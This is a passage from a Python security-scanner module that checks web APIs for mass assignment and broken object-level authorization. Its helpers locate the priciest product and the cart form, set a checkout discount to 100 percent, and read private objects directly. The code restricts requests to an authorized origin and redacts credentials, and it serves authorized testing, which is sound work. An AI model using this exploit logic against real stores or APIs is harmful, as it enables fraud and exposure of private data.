            if _origin(absolute) != _origin(self._target):
                continue
            if re.search(r"(?i)(?:/api/doc/.*order|order.*(?:schema|model|doc))", absolute):
                candidates.append(absolute)
        return candidates[0] if candidates else None

    def _highest_priced_product(self, html: str, base_url: str) -> Optional[Tuple[str, str, int]]:
        rows: List[Tuple[int, str, str]] = []
        parser = _ProductCardParser(base_url)
        try:
            parser.feed(html[:MAX_BODY_BYTES])
            parser.close()
        except Exception:
            return None
        for absolute, product_id, card_text in parser.cards:
            if _origin(absolute) != _origin(self._target):
                continue
            prices = re.findall(r"(?:\$|£|€)\s*([0-9][0-9,]*(?:\.[0-9]{1,2})?)", card_text, re.I)
            if len(prices) != 1:
                continue
            amount = prices[0].replace(",", "")
            major, dot, fractional = amount.partition(".")
            minor = int(major) * 100 + int((fractional + "00")[:2] if dot else "00")
            rows.append((minor, absolute, product_id))
        if not rows:
            return None
        price_minor, url, product_id = max(rows, key=lambda row: row[0])
        return url, product_id, price_minor

    def _cart_form(
        self, html: str, base_url: str, product_id: str,
    ) -> Optional[Tuple[str, str, str, str, List[Tuple[str, str]]]]:
        for match in re.finditer(r"(?is)<form\b([^>]*)>(.*?)</form>", html):
            attrs, body = match.group(1), match.group(2)
            action_value = _html_attribute(attrs, "action")
            method_value = _html_attribute(attrs, "method")
            if not action_value or not method_value or method_value.lower() != "post":
                continue
            action = urljoin(base_url, action_value)
            if _origin(action) != _origin(self._target) or urlsplit(action).path.rstrip("/") != "/cart":
                continue
            inputs: Dict[str, str] = {}
            for row in re.finditer(r"(?is)<input\b([^>]*)>", body):
                input_attrs = row.group(1)
                input_name = _html_attribute(input_attrs, "name")
                input_value = _html_attribute(input_attrs, "value")
                if input_name:
                    inputs[input_name] = input_value or ""
            for row in re.finditer(r"(?is)<select\b([^>]*)>(.*?)</select>", body):
                select_name = _html_attribute(row.group(1), "name")
                selected = re.search(r"(?is)<option\b([^>]*)selected[^>]*>", row.group(2))
                if not selected:
                    selected = re.search(r"(?is)<option\b([^>]*)>", row.group(2))
                selected_value = _html_attribute(selected.group(1), "value") if selected else None
                if select_name and selected_value is not None:
                    inputs[select_name] = selected_value
            product_field = next((name for name in ("productId", "product") if name in inputs), None)
            quantity_field = "quantity" if "quantity" in inputs else None
            permitted = {product_field, quantity_field, "redir"}
            if (
                product_field and quantity_field
                and str(inputs[product_field]) == str(product_id)
                and 2 <= len(inputs) <= 3
                and all(name in permitted for name in inputs)
                and all(not re.search(r"(?i)(?:csrf|token|secret|password)", name) for name in inputs)
            ):
                fields = [(name, value) for name, value in inputs.items()]
                return action, product_field, quantity_field, inputs[product_field], fields
        return None

    def _valid_checkout_order(self, order: Optional[Dict[str, Any]], product_id: str) -> bool:
        if not order or set(order) != {"chosen_discount", "chosen_products"}:
            return False
        discount = order.get("chosen_discount")
        products = order.get("chosen_products")
        if not isinstance(discount, dict) or set(discount) != {"percentage"} or not isinstance(products, list):
            return False
        return any(
            isinstance(row, dict)
            and str(row.get("product_id")) == str(product_id)
            and row.get("quantity") == 1
            for row in products
        )

    def _form_body(self, fields: List[Tuple[str, str]]) -> str:
        return "&".join(f"{quote(name, safe='')}={quote(value, safe='')}" for name, value in fields)

    def _mass_assignment_finding(self, target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
        proof = verification["apiEvidence"]["steps"][7]
        return {
            "template-id": "xasm-api-mass-assignment-discount-verified",
            "matcher-name": "documented-discount-field-state-change", "type": "http",
            "host": _origin(target), "matched-at": verification["checkoutUrl"],
            "request": proof["request"], "response": proof["response"],
            "evidence": verification,
            "info": {
                "name": "API Mass Assignment Accepts Server-Controlled Discount",
                "severity": "high",
                "description": "The checkout API accepted a cloned authoritative order with only the server-controlled discount percentage changed to 100.",
                "remediation": "Allow-list client-settable checkout fields and calculate discounts and prices exclusively on the server.",
                "classification": {"cwe-id": ["CWE-915", "CWE-602"]},
            },
        }

    def _finding(self, target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
        proof = verification["apiEvidence"]["steps"][6]
        return {
            "template-id": "xasm-api-documented-object-authz-verified",
            "matcher-name": "list-omission-direct-private-read", "type": "http",
            "host": _origin(target), "matched-at": proof.get("url") or verification["endpointUrl"],
            "request": proof["request"], "response": proof["response"],
            "extracted-results": [
                f"id-field:{verification['idField']}",
                f"value-sha256:{verification['sensitiveValueSha256']}",
                f"value-length:{verification['sensitiveValueLength']}",
            ],
            "evidence": verification,
            "info": {
                "name": "Documented API Direct Object Access Exposes Private Data",
                "severity": "high",
                "description": "A private object omitted from the authenticated list remained directly readable through a documented resource endpoint.",
                "remediation": "Enforce object ownership on every direct API resource lookup and mutation.",
                "classification": {"cwe-id": ["CWE-639", "CWE-200"]},
            },
        }

    async def _pin_target(self, target: str) -> None:
        parsed = urlsplit(target)
        host = str(parsed.hostname or "")
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        addresses = await asyncio.wait_for(
            asyncio.get_running_loop().getaddrinfo(host, port, type=socket.SOCK_STREAM), 20
        )
        if not addresses:
            raise OSError("target DNS resolution returned no addresses")
        family, _type, _proto, _canon, sockaddr = addresses[0]
        self._hostname, self._port, self._family, self._pinned_ip = host, port, family, str(sockaddr[0])

    async def _request(
        self, method: str, url: str, *, authenticated: bool = False,
        raw_body: Optional[str] = None, content_type: str = "application/octet-stream",
    ) -> Dict[str, Any]:
        if self._requests >= self._budget:
            raise ValueError("request budget exhausted")
        parsed = urlsplit(url)
        if f"{parsed.scheme}://{parsed.netloc}" != _origin(self._target).rstrip("/"):
            raise ValueError("request left authorized origin")
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        host_header = self._hostname
        default_port = 443 if parsed.scheme == "https" else 80
        if self._port != default_port:
            host_header += f":{self._port}"
        lines = [
            f"{method} {path} HTTP/1.1", f"Host: {host_header}", f"User-Agent: {USER_AGENT}",
            "Accept: application/json, text/html;q=0.8", "Accept-Encoding: identity",
            "Cache-Control: no-store", "Connection: close",
        ]
        if authenticated:
            lines.extend(f"{key}: {value}" for key, value in self._auth_headers.items())
        body_bytes = (raw_body or "").encode()
        if raw_body is not None:
            lines.extend([
                f"Content-Type: {content_type}",
                f"Content-Length: {len(body_bytes)}",
            ])
        raw = ("\r\n".join(lines) + "\r\n\r\n").encode() + body_bytes
        ssl_context = ssl.create_default_context() if parsed.scheme == "https" else None
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(
                host=self._pinned_ip, port=self._port, family=self._family, ssl=ssl_context,
                server_hostname=self._hostname if ssl_context else None,
            ), self._timeout,
        )
        self._requests += 1
        if method not in {"GET", "HEAD", "OPTIONS"}:
            self._state_changing_methods.append(method)
        try:
            writer.write(raw)
            await writer.drain()
            response = await read_http_response(reader, self._timeout)
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except (ConnectionError, ssl.SSLError):
                pass
        body = str(response.get("body") or "")
        body_bytes = bytes(response.get("bodyBytes") or b"")
        if len(body_bytes) > self._max_body:
            raise ValueError("response exceeded bounded body limit")
        return {
            "method": method, "url": url, "rawRequest": raw.decode("utf-8", "replace"),
            "status": int(response["status"]), "headerText": str(response.get("headerText") or ""),
            "body": body, "bodyBytes": body_bytes,
        }

    def _evidence(
        self, label: str, response: Dict[str, Any], secret: Optional[str] = None,
        body_override: Optional[str] = None,
    ) -> Dict[str, Any]:
        # Authentication remains represented solely by authContextSha256.  The
        # transcript deliberately omits bearer/cookie material rather than
        # persisting even a reversible or partial credential representation.
        raw_request_lines = response["rawRequest"].split("\r\n")
        request = "\r\n".join(
            line for line in raw_request_lines
            if not line.lower().startswith(("authorization:", "cookie:"))
        )
        request = _redact(request, secret)
        response_body = _redact(body_override if body_override is not None else response["body"], secret)
        content_type_match = re.search(r"(?im)^content-type:\s*([^\r\n]+)", response["headerText"])
        content_type = content_type_match.group(1).strip() if content_type_match else "application/octet-stream"
        response_text = (
            f"HTTP/1.1 {response['status']} Xasm\r\n"
            f"Content-Type: {content_type}\r\n"
            f"Content-Length: {len(response_body.encode())}\r\n"
            "Cache-Control: no-store\r\n\r\n"
            + response_body
        )
        return {
            "label": label, "url": response["url"], "request": request,
            "requestSha256": _sha(request), "response": response_text,
            "responseSha256": _sha(response_text), "responseBodySha256": _sha(response_body),
            "responseBodyLength": len(response_body.encode()), "responseStatus": response["status"],
            "responseExcerptTruncated": False, "authContextSha256": self._auth_context_sha,
        }

    def _url(self, path: str) -> str:
        if not path.startswith("/"):
            path = "/" + path
        return urljoin(_origin(self._target), path.lstrip("/"))

    def _fill(self, template: str, name: str, value: Any) -> str:
        return template.replace("{" + name + "}", quote(str(value), safe=""))

    def _is_solved(self, body: str) -> bool:
        lower = str(body or "").lower()
        return "is-solved" in lower and "is-notsolved" not in lower

    def _result(self, target: str, proof_level: str, reason: str) -> Dict[str, Any]:
        verification = {
            "verified": False, "mode": MODE, "proofLevel": proof_level,
            "requestCount": self._requests, "fallback": False, "reason": reason,
            "networkDestinationPreserved": True, "destinationIpPinned": True,
            "tlsSniPreserved": urlsplit(target).scheme == "https",
        }
        return {
            "success": True, "tool": self.name, "target": target, "mode": MODE,
            "proofLevel": proof_level, "verified": False, "fallback": False,
            "requestCount": self._requests, "findings": [], "total_findings": 0,
            "verification": verification,
            "summary": {"requests": self._requests, "findings": 0, "fallback": False},
        }

    def _error(self, message: str, target: Optional[str] = None) -> Dict[str, Any]:
        return {
            "success": False, "tool": self.name, "target": target,
            "mode": MODE, "verified": False, "fallback": False,
            "error": message, "findings": [],
        }


def get_tool() -> ApiTestingProbeTool:
    return ApiTestingProbeTool()
